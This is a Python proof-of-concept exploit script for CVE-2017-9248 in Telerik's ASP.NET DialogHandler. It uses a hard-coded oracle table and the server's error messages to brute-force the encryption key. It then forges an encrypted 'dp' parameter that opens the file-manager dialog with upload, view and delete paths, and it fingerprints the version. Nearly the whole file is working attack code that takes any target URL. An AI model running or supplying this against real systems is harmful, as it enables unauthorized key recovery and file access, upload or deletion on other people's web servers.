#! -*- coding: utf-8 -*-
import re
import base64
import itertools
import requests
import argparse

from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class Exploit:

	user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"
	oracle = [
		[1, 328, 442, 0, -1], [2, 207, 321, 128, -1], [3, 127, 206, 73, -1], [4, 64, 126, 219, -1], [5, 37, 59, 141, -1],
		[6, 22, 34, 24, -1], [7, 16, 19, 173, -1], [8, -1, 13, 29, -1], [9, -1, 12, 27, -1], [10, -1, 11, 133, -1],       
		[-1, -1, -1, -1, 133], [-1, -1, -1, -1, 165], [-1, -1, -1, -1, 22], [14, -1, 15, 25, -1], [-1, -1, -1, -1, 23],   
		[-1, -1, -1, -1, 20], [17, -1, 18, 139, -1], [-1, -1, -1, -1, 155], [-1, -1, -1, -1, 134], [20, -1, 21, 132, -1], 
		[-1, -1, -1, -1, 167], [-1, -1, -1, -1, 164], [23, 28, 31, 81, -1], [24, 25, -1, 4, -1], [-1, -1, -1, -1, 95],    
		[26, 27, -1, 5, -1], [-1, -1, -1, -1, 94], [-1, -1, -1, -1, 93], [29, 30, -1, 1, -1], [-1, -1, -1, -1, 41],       
		[-1, -1, -1, -1, 96], [32, 33, -1, 1, -1], [-1, -1, -1, -1, 92], [-1, -1, -1, -1, 91], [35, -1, 36, 27, -1],      
		[-1, -1, -1, -1, 21], [-1, -1, -1, -1, 18], [38, 48, 54, 214, -1], [39, 42, 45, 245, -1], [40, 41, -1, 133, -1],  
		[-1, -1, -1, -1, 254], [-1, -1, -1, -1, 221], [43, 44, -1, 129, -1], [-1, -1, -1, -1, 222], [-1, -1, -1, -1, 192],
		[46, 47, -1, 132, -1], [-1, -1, -1, -1, 255], [-1, -1, -1, -1, 252], [49, 50, 53, 134, -1], [-1, -1, -1, -1, 253],
		[51, 52, -1, 129, -1], [-1, -1, -1, -1, 187], [-1, -1, -1, -1, 224], [-1, -1, -1, -1, 166], [55, 58, -1, 129, -1],
		[56, 57, -1, 132, -1], [-1, -1, -1, -1, 223], [-1, -1, -1, -1, 220], [-1, -1, -1, -1, 219], [60, -1, 61, 137, -1],
		[-1, -1, -1, -1, 135], [62, -1, 63, 138, -1], [-1, -1, -1, -1, 132], [-1, -1, -1, -1, 128], [65, 98, 119, 163, -1],
		[66, 81, 93, 149, -1], [67, 75, 78, 136, -1], [68, 71, 74, 171, -1], [69, -1, 70, 130, -1], [-1, -1, -1, -1, 142],
		[-1, -1, -1, -1, 143], [72, -1, 73, 147, -1], [-1, -1, -1, -1, 157], [-1, -1, -1, -1, 153], [-1, -1, -1, -1, 139],
		[76, 77, -1, 129, -1], [-1, -1, -1, -1, 191], [-1, -1, -1, -1, 188], [79, -1, 80, 140, -1], [-1, -1, -1, -1, 130],
		[-1, -1, -1, -1, 129], [82, 86, 92, 131, -1], [83, 84, 85, 130, -1], [-1, -1, -1, -1, 161], [-1, -1, -1, -1, 173],
		[-1, -1, -1, -1, 162], [87, 88, 91, 136, -1], [-1, -1, -1, -1, 172], [89, 90, -1, 130, -1], [-1, -1, -1, -1, 190],
		[-1, -1, -1, -1, 186], [-1, -1, -1, -1, 168], [-1, -1, -1, -1, 163], [94, -1, 95, 145, -1], [-1, -1, -1, -1, 159],
		[96, -1, 97, 146, -1], [-1, -1, -1, -1, 156], [-1, -1, -1, -1, 152], [99, 110, 118, 168, -1], [100, -1, 105, 158, -1],
		[101, -1, 104, 129, -1], [102, -1, 103, 152, -1], [-1, -1, -1, -1, 150], [-1, -1, -1, -1, 146], [-1, -1, -1, -1, 140],
		[106, -1, 107, 153, -1], [-1, -1, -1, -1, 151], [108, -1, 109, 154, -1], [-1, -1, -1, -1, 148], [-1, -1, -1, -1, 147],
		[111, 114, 117, 177, -1], [112, -1, 113, 152, -1], [-1, -1, -1, -1, 144], [-1, -1, -1, -1, 149], [115, -1, 116, 144, -1],
		[-1, -1, -1, -1, 158], [-1, -1, -1, -1, 154], [-1, -1, -1, -1, 145], [-1, -1, -1, -1, 136], [120, 123, -1, 129, -1],
		[121, 122, -1, 130, -1], [-1, -1, -1, -1, 131], [-1, -1, -1, -1, 169], [124, -1, 125, 138, -1], [-1, -1, -1, -1, 174],
		[-1, -1, -1, -1, 170], [-1, -1, -1, -1, 251], [128, 170, 199, 40, -1], [129, 152, 163, 8, -1], [130, 143, 147, 32, -1],
		[131, 137, -1, 80, -1], [132, 135, 136, 1, -1], [-1, 133, 134, 3, -1], [-1, -1, -1, -1, 44], [-1, -1, -1, -1, 14],
		[-1, -1, -1, -1, 46], [-1, -1, -1, -1, 12], [138, 141, 142, 9, -1], [139, -1, 140, 4, -1], [-1, -1, -1, -1, 6],
		[-1, -1, -1, -1, 36], [-1, -1, -1, -1, 38], [-1, -1, -1, -1, 4], [144, 145, 146, 43, -1], [-1, -1, -1, -1, 15],
		[-1, -1, -1, -1, 19], [-1, -1, -1, -1, 11], [148, 151, -1, 1, -1], [149, 150, -1, 2, -1], [-1, -1, -1, -1, 0],
		[-1, -1, -1, -1, 45], [-1, -1, -1, -1, 42], [153, 157, 162, 3, -1], [154, 155, 156, 7, -1], [-1, -1, -1, -1, 60],
		[-1, -1, -1, -1, 63], [-1, -1, -1, -1, 39], [158, 159, -1, 2, -1], [-1, -1, -1, -1, 62], [160, 161, -1, 6, -1],
		[-1, -1, -1, -1, 58], [-1, -1, -1, -1, 59], [-1, -1, -1, -1, 35], [164, -1, 167, 11, -1], [165, 166, -1, 3, -1],
		[-1, -1, -1, -1, 5], [-1, -1, -1, -1, 40], [168, -1, 169, 12, -1], [-1, -1, -1, -1, 2], [-1, -1, -1, -1, 1],
		[171, 185, 194, 16, -1], [172, 178, 184, 35, -1], [173, 176, 177, 39, -1], [174, -1, 175, 18, -1], [-1, -1, -1, -1, 28],
		[-1, -1, -1, -1, 24], [-1, -1, -1, -1, 31], [-1, -1, -1, -1, 7], [179, 182, 183, 48, -1], [180, -1, 181, 19, -1],
		[-1, -1, -1, -1, 17], [-1, -1, -1, -1, 30], [-1, -1, -1, -1, 27], [-1, -1, -1, -1, 16], [-1, -1, -1, -1, 3],
		[186, 189, -1, 4, -1], [187, 188, -1, 1, -1], [-1, -1, -1, -1, 127], [-1, -1, -1, -1, 123], [190, 191, -1, 5, -1],
		[-1, -1, -1, -1, 126], [192, 193, -1, 6, -1], [-1, -1, -1, -1, 125], [-1, -1, -1, -1, 124], [195, -1, 196, 19, -1],
		[-1, -1, -1, -1, 29], [197, -1, 198, 20, -1], [-1, -1, -1, -1, 26], [-1, -1, -1, -1, 25], [200, -1, 203, 1, -1],
		[201, -1, 202, 2, -1], [-1, -1, -1, -1, 37], [-1, -1, -1, -1, 34], [204, -1, 205, 2, -1], [-1, -1, -1, -1, 33],
		[-1, -1, -1, -1, 8], [-1, -1, -1, -1, 64], [208, 269, 314, 218, -1], [209, 240, 262, 250, -1], [210, 229, 237, 203, -1],
		[211, 219, 224, 236, -1], [212, 215, 216, 219, -1], [213, 214, -1, 132, -1], [-1, -1, -1, -1, 196], [-1, -1, -1, -1, 197],
		[-1, -1, -1, -1, 244], [217, 218, -1, 136, -1], [-1, -1, -1, -1, 214], [-1, -1, -1, -1, 210], [220, 221, -1, 130, -1],
		[-1, -1, -1, -1, 217], [222, 223, -1, 131, -1], [-1, -1, -1, -1, 216], [-1, -1, -1, -1, 212], [225, 226, -1, 129, -1],
		[-1, -1, -1, -1, 225], [227, 228, -1, 133, -1], [-1, -1, -1, -1, 229], [-1, -1, -1, -1, 230], [230, 233, 236, 210, -1],
		[231, 232, -1, 131, -1], [-1, -1, -1, -1, 248], [-1, -1, -1, -1, 246], [234, 235, -1, 130, -1], [-1, -1, -1, -1, 249],
		[-1, -1, -1, -1, 228], [-1, -1, -1, -1, 242], [238, 239, -1, 129, -1], [-1, -1, -1, -1, 193], [-1, -1, -1, -1, 198],
		[241, 252, 261, 241, -1], [242, 247, -1, 146, -1], [243, 244, -1, 141, -1], [-1, -1, -1, -1, 205], [245, 246, -1, 142, -1],
		[-1, -1, -1, -1, 206], [-1, -1, -1, -1, 207], [248, 249, -1, 136, -1], [-1, -1, -1, -1, 213], [250, 251, -1, 138, -1],
		[-1, -1, -1, -1, 202], [-1, -1, -1, -1, 203], [253, 257, 260, 227, -1], [254, 255, 256, 226, -1], [-1, -1, -1, -1, 199],
		[-1, -1, -1, -1, 201], [-1, -1, -1, -1, 194], [258, 259, -1, 136, -1], [-1, -1, -1, -1, 200], [-1, -1, -1, -1, 204],
		[-1, -1, -1, -1, 195], [-1, -1, -1, -1, 209], [263, 266, -1, 136, -1], [264, 265, -1, 137, -1], [-1, -1, -1, -1, 247],
		[-1, -1, -1, -1, 243], [267, 268, -1, 129, -1], [-1, -1, -1, -1, 218], [-1, -1, -1, -1, 240], [270, 290, 309, 184, -1],
		[271, 279, 289, 150, -1], [272, 275, 278, 152, -1], [273, 274, -1, 136, -1], [-1, -1, -1, -1, 180], [-1, -1, -1, -1, 176],
		[276, 277, -1, 139, -1], [-1, -1, -1, -1, 183], [-1, -1, -1, -1, 179], [-1, -1, -1, -1, 184], [280, 283, 286, 162, -1],
		[281, 282, -1, 129, -1], [-1, -1, -1, -1, 189], [-1, -1, -1, -1, 185], [284, 285, -1, 131, -1], [-1, -1, -1, -1, 227],
		[-1, -1, -1, -1, 231], [287, -1, 288, 139, -1], [-1, -1, -1, -1, 175], [-1, -1, -1, -1, 171], [-1, -1, -1, -1, 182],
		[291, 302, 308, 194, -1], [292, 297, -1, 146, -1], [293, 294, -1, 140, -1], [-1, -1, -1, -1, 236], [295, 296, -1, 142, -1],
		[-1, -1, -1, -1, 238], [-1, -1, -1, -1, 239], [298, 299, -1, 136, -1], [-1, -1, -1, -1, 232], [300, 301, -1, 138, -1],
		[-1, -1, -1, -1, 234], [-1, -1, -1, -1, 235], [303, 306, 307, 201, -1], [304, 305, -1, 136, -1], [-1, -1, -1, -1, 245],
		[-1, -1, -1, -1, 237], [-1, -1, -1, -1, 241], [-1, -1, -1, -1, 233], [-1, -1, -1, -1, 226], [310, 311, -1, 136, -1],
		[-1, -1, -1, -1, 178], [312, 313, -1, 137, -1], [-1, -1, -1, -1, 181], [-1, -1, -1, -1, 177], [315, 318, -1, 136, -1],
		[316, 317, -1, 137, -1], [-1, -1, -1, -1, 215], [-1, -1, -1, -1, 211], [319, 320, -1, 129, -1], [-1, -1, -1, -1, 250],
		[-1, -1, -1, -1, 208], [322, -1, 325, 131, -1], [323, -1, 324, 132, -1], [-1, -1, -1, -1, 160], [-1, -1, -1, -1, 141],
		[326, -1, 327, 132, -1], [-1, -1, -1, -1, 138], [-1, -1, -1, -1, 137], [329, 390, 435, 90, -1], [330, 361, 383, 122, -1],
		[331, 350, 358, 75, -1], [332, 340, 345, 108, -1], [333, 336, 337, 91, -1], [334, 335, -1, 4, -1], [-1, -1, -1, -1, 68],
		[-1, -1, -1, -1, 69], [-1, -1, -1, -1, 116], [338, 339, -1, 8, -1], [-1, -1, -1, -1, 86], [-1, -1, -1, -1, 82],
		[341, 342, -1, 2, -1], [-1, -1, -1, -1, 89], [343, 344, -1, 3, -1], [-1, -1, -1, -1, 88], [-1, -1, -1, -1, 84],
		[346, 347, -1, 1, -1], [-1, -1, -1, -1, 97], [348, 349, -1, 5, -1], [-1, -1, -1, -1, 101], [-1, -1, -1, -1, 102],
		[351, 354, 357, 82, -1], [352, 353, -1, 3, -1], [-1, -1, -1, -1, 120], [-1, -1, -1, -1, 118], [355, 356, -1, 2, -1],
		[-1, -1, -1, -1, 121], [-1, -1, -1, -1, 100], [-1, -1, -1, -1, 114], [359, 360, -1, 1, -1], [-1, -1, -1, -1, 65],
		[-1, -1, -1, -1, 70], [362, 373, 382, 113, -1], [363, 368, -1, 18, -1], [364, 365, -1, 13, -1], [-1, -1, -1, -1, 77],
		[366, 367, -1, 14, -1], [-1, -1, -1, -1, 78], [-1, -1, -1, -1, 79], [369, 370, -1, 8, -1], [-1, -1, -1, -1, 85],
		[371, 372, -1, 10, -1], [-1, -1, -1, -1, 74], [-1, -1, -1, -1, 75], [374, 378, 381, 99, -1], [375, 376, 377, 98, -1],
		[-1, -1, -1, -1, 71], [-1, -1, -1, -1, 73], [-1, -1, -1, -1, 66], [379, 380, -1, 8, -1], [-1, -1, -1, -1, 72],
		[-1, -1, -1, -1, 76], [-1, -1, -1, -1, 67], [-1, -1, -1, -1, 81], [384, 387, -1, 8, -1], [385, 386, -1, 9, -1],
		[-1, -1, -1, -1, 119], [-1, -1, -1, -1, 115], [388, 389, -1, 1, -1], [-1, -1, -1, -1, 90], [-1, -1, -1, -1, 112],
		[391, 411, 430, 56, -1], [392, 400, 410, 22, -1], [393, 396, 399, 24, -1], [394, 395, -1, 8, -1], [-1, -1, -1, -1, 52],
		[-1, -1, -1, -1, 48], [397, 398, -1, 11, -1], [-1, -1, -1, -1, 55], [-1, -1, -1, -1, 51], [-1, -1, -1, -1, 56],
		[401, 404, 407, 34, -1], [402, 403, -1, 1, -1], [-1, -1, -1, -1, 61], [-1, -1, -1, -1, 57], [405, 406, -1, 3, -1],
		[-1, -1, -1, -1, 99], [-1, -1, -1, -1, 103], [408, -1, 409, 11, -1], [-1, -1, -1, -1, 47], [-1, -1, -1, -1, 43],
		[-1, -1, -1, -1, 54], [412, 423, 429, 66, -1], [413, 418, -1, 18, -1], [414, 415, -1, 12, -1], [-1, -1, -1, -1, 108],
		[416, 417, -1, 14, -1], [-1, -1, -1, -1, 110], [-1, -1, -1, -1, 111], [419, 420, -1, 8, -1], [-1, -1, -1, -1, 104],
		[421, 422, -1, 10, -1], [-1, -1, -1, -1, 106], [-1, -1, -1, -1, 107], [424, 427, 428, 73, -1], [425, 426, -1, 8, -1],
		[-1, -1, -1, -1, 117], [-1, -1, -1, -1, 109], [-1, -1, -1, -1, 113], [-1, -1, -1, -1, 105], [-1, -1, -1, -1, 98],
		[431, 432, -1, 8, -1], [-1, -1, -1, -1, 50], [433, 434, -1, 9, -1], [-1, -1, -1, -1, 53], [-1, -1, -1, -1, 49],
		[436, 439, -1, 8, -1], [437, 438, -1, 9, -1], [-1, -1, -1, -1, 87], [-1, -1, -1, -1, 83], [440, 441, -1, 1, -1],
		[-1, -1, -1, -1, 122], [-1, -1, -1, -1, 80], [443, -1, 446, 3, -1], [444, -1, 445, 4, -1], [-1, -1, -1, -1, 32],
		[-1, -1, -1, -1, 13], [447, -1, 448, 4, -1], [-1, -1, -1, -1, 10], [-1, -1, -1, -1, 9]
	]

	def __init__(self, target_url):
		self.url = target_url
		self.client = requests.session()
		self.client.headers.update({'User-Agent': self.user_agent})
		self.client.verify = False
		self.key = ""
		self.version = "unknown"

	def xor(self, data, key):
		return "".join([chr(ord(a)^ord(b)) 
					for a, b in zip(data, itertools.cycle(key))])

	def base64_encode(self, string):
		return "".join(map(chr, base64.b64encode(string.encode())))

	def base64_decode(self, string):
		return "".join(map(chr, base64.b64decode(string.encode())))

	def get_exception_code(self, url):
		r = self.client.get(url)
		try:
			error = r.text.split("Error Message:")[1].split("</div>")[0]
		except:
			error = r.text.split("Exception Details:")[1].split("<br>")[0]
		tokens = ["character", "length", "outside"]
		for i, token in enumerate(tokens):
			if token in error: return i

	def bruteforce_key(self):
		url = self.url.rstrip("/")
		print(f"[+] Enter URL: {url}")
		total_count = 0
		for pos in range(len(self.key), 48):
			node = 0
			while self.oracle[node][-1] == -1:
				index = self.oracle[node][-2]
				junk = " " * pos
				send = self.xor(junk, self.key) + chr(index)
				url = self.url + "?dp=" + self.base64_encode(send)
				code = self.get_exception_code(url)
				node = self.oracle[node][code]
				total_count += 1
			key_char = chr(self.oracle[node][-1])
			self.key += key_char
			print(self.key)
		print(f"[+] Found key: {self.key}. Total requests: {total_count}")

	def bruteforce_version(self, path="~"):
		dialog = "Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog"
		enc_path = self.base64_encode(self.base64_encode(path))
		dp_params = [
			"Telerik.DialogDefinition.DialogTypeName,False,0," + self.base64_encode(dialog),
			"Language,False,0,ZW4tVVM=",
			"ExternalDialogsPath,False,0,",
			"LocalizationPath,False,0,",
			"ViewPaths,True,0," + enc_path,
			"UploadPaths,True,0," + enc_path,
			"DeletePaths,True,0," + enc_path,
			"SearchPatterns,True,0,S2k0cQ==",
			"MaxUploadFileSize,False,1,204800",
			"FileBrowserContentProviderTypeName,False,0,",
			"EnableAsyncUpload,False,3,True",
			"AllowMultipleSelection,False,3,False",
			"EnableEmbeddedSkins,False,3,True",
			"EnableEmbeddedBaseStylesheet,False,3,True",
			"IsSkinTouch,False,3,False",
		]
		dp_plaintext = ";".join(dp_params)
		dp_encrypted = self.base64_encode(self.xor(self.base64_encode(dp_plaintext), self.key))
		params = {'dp': dp_encrypted, 'Skin': "Default"}
		r = self.client.get(self.url, params=params)
		try:
			version = r.text.split("<!-- ")[1].split(" -->")[0]
			print(f"[+] {version}: {r.url}")
		except:
			print(f"[+] unknown: {r.url}")
	
	def verify(self):
		url = self.url + "?dp=:))"
		r = self.client.get(url)
		return "character" in r.text

def mode_help():
    print(
        "Usage:\n" +
        "\n" +
        "python cve_2017_9248.py http://target.com"
    )
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='PoC for CVE-2017-9248')
    parser.add_argument(
        "-u",
        dest="url",
        required=True,
        help="https://target.com"
    )
    parser.add_argument(
        "-f",
        dest="folder",
        default="~/",
        help="~/js or ~/css. Default ~/",)

    args = parser.parse_args()
    url = args.url if args.url.endswith("/") else args.url + "/"
    exploit = Exploit(url + "Telerik.Web.UI.DialogHandler.aspx")
    exploit.bruteforce_key()
    exploit.bruteforce_version(args.folder)